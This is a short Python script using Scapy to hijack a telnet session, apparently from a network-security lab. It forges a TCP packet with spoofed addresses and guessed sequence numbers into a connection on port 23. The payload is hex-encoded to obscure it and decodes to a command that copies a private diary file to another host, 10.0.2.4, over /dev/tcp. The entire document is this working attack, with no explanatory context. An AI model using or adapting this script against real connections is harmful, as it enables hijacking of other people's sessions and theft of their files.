#!/usr/bin/python
from scapy.all import *

ip = IP(src="10.0.2.5",dst="10.0.2.6")
tcp = TCP(sport=39132,dport=23,flags="AP",seq=3463666582,ack=1845868498)
data = "0a63617420686f73745f436c6f6e652f636f72655f66696c652f6d796469617279203e202f6465762f7463702f31302e302e322e342f393039300a"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
